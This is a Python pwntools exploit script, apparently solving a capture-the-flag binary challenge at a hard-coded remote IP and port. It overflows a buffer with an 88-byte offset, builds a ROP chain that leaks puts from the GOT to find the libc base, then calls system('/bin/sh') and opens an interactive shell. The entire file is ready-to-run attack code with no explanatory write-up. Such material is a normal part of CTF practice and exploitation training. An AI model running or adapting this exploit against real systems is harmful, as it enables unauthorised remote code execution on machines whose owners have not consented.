from pwn import *

# --- CONFIGURATION ---
ip = '34.40.105.109'
port = 30396
offset = 88

# --- ADDRESSES ---
# From your successful leak/dump
puts_plt = 0x400560
puts_got = 0x601018
stop_gadget = 0x4005c0
pop_rdi = 0x4007c3      # Your gadget
ret_gadget = 0x4007c4   # Extra ret for alignment (pop_rdi + 1)

# Load Libc
libc = ELF('./libc-2.23.so', checksec=False)
context.arch = 'amd64'

p = remote(ip, port)
p.recvuntil(b"friend?\n")

log.info(f"Using puts@got: {hex(puts_got)}")

# --- STAGE 1: LEAK LIBC ---
log.info("Stage 1: Leaking libc address...")

payload = b"A" * offset
payload += p64(pop_rdi)
payload += p64(puts_got)     # Arg1: puts@got
payload += p64(puts_plt)     # Function: puts
payload += p64(stop_gadget)  # Restart main

p.sendline(payload)

# Receive the leak
try:
    # Read until the line ending (the leak)
    # Note: Sometimes there might be a trailing newline from puts
    data = p.recvline()
    if b"blind" in data: # Retry if we caught the prompt by accident
        data = p.recvline()

    if data.endswith(b'\n'): data = data[:-1]

    leaked_addr = u64(data.ljust(8, b'\x00'))
    log.success(f"Leaked puts address: {hex(leaked_addr)}")

    libc.address = leaked_addr - libc.symbols['puts']
    log.success(f"Libc Base: {hex(libc.address)}")

except Exception as e:
    log.error(f"Leak failed: {e}")
    exit()

# --- STAGE 2: SHELL ---
log.info("Stage 2: Popping shell...")

# [!] CRITICAL FIX 1: Sync with the server
# We must consume the "Are you blind?" prompt from the restart
p.recvuntil(b"friend?\n")

bin_sh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']

payload2 = b"A" * offset
# [!] CRITICAL FIX 2: Stack Alignment
# We add a simple 'ret' instruction. This shifts the stack by 8 bytes.
# Try with this first. If it fails, remove it.
payload2 += p64(ret_gadget)
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh)
payload2 += p64(system)

p.sendline(payload2)

p.interactive()